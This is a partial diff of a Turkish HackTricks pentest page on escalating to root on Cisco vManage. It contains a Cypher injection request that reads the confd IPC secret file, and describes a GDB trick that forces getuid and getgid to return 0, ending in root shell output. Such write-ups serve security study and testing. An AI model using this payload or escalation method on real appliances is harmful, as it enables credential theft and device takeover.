@@ -1,31 +1,31 @@
 # Cisco - vmanage
 
 {% hint style="success" %}
-AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>HackTricks'i Destekleyin</summary>
+<summary>Support HackTricks</summary>
 
-* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
-* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
 ## Path 1
 
-(Örnek [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html) adresinden)
+(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-`confd` ve Cisco web sitesinde bir hesapla erişilebilen farklı ikili dosyalarla ilgili bazı [belgelere](http://66.218.245.39/doc/html/rn03re18.html) biraz araştırma yaptıktan sonra, IPC soketini kimlik doğrulamak için `/etc/confd/confd_ipc_secret` konumunda bulunan bir gizli anahtar kullandığını bulduk:
+Biraz `confd` ve Cisco web sitesinde bir hesapla erişilebilen farklı ikili dosyalarla ilgili bazı [belgelere](http://66.218.245.39/doc/html/rn03re18.html) göz attıktan sonra, IPC soketini kimlik doğrulamak için `/etc/confd/confd_ipc_secret` içinde bulunan bir gizli anahtar kullandığını bulduk:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-Hatırlıyor musunuz Neo4j örneğimizi? `vmanage` kullanıcısının ayrıcalıkları altında çalışıyor, bu da bize önceki zafiyeti kullanarak dosyayı almamıza olanak tanıyor:
+Neo4j örneğimizi hatırlıyor musunuz? `vmanage` kullanıcısının ayrıcalıkları altında çalışıyor, bu da bize önceki zafiyeti kullanarak dosyayı almamıza olanak tanıyor:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -97,13 +97,13 @@ vmanage:~$ ps aux
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-Ben “confd\_cli” programının, oturum açmış kullanıcıdan topladığı kullanıcı kimliğini ve grup kimliğini “cmdptywrapper” uygulamasına ilettiğini varsaydım.
+Ben “confd\_cli” programının, oturum açmış kullanıcıdan topladığı kullanıcı kimliği ve grup kimliğini “cmdptywrapper” uygulamasına ilettiğini varsaydım.
 
 İlk denemem “cmdptywrapper”'ı doğrudan çalıştırmak ve ona `-g 0 -u 0` sağlamak oldu, ancak başarısız oldu. Görünüşe göre bir dosya tanımlayıcısı (-i 1015) bir yerde oluşturulmuş ve bunu taklit edemiyorum.
 
 Synacktiv’in blogunda belirtildiği gibi (son örnek), `confd_cli` programı komut satırı argümanlarını desteklemiyor, ancak bir hata ayıklayıcı ile bunu etkileyebilirim ve şans eseri GDB sistemde mevcut.
 
-API `getuid` ve `getgid`'in 0 döndürmesini zorladığım bir GDB betiği oluşturdum. Zaten deserialization RCE aracılığıyla “vmanage” ayrıcalığına sahip olduğum için, `/etc/confd/confd_ipc_secret` dosyasını doğrudan okuma iznim var.
+API `getuid` ve `getgid`'in 0 döndürmesini sağladığım bir GDB betiği oluşturdum. Zaten deserialization RCE aracılığıyla “vmanage” ayrıcalığına sahip olduğum için, `/etc/confd/confd_ipc_secret` dosyasını doğrudan okuma iznim var.
 
 root.gdb:
 ```
@@ -158,15 +158,15 @@ uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
 {% hint style="success" %}
-AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Ekip Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Ekip Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricks'i Destekleyin</summary>
 
 * [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Bize katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
 * **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
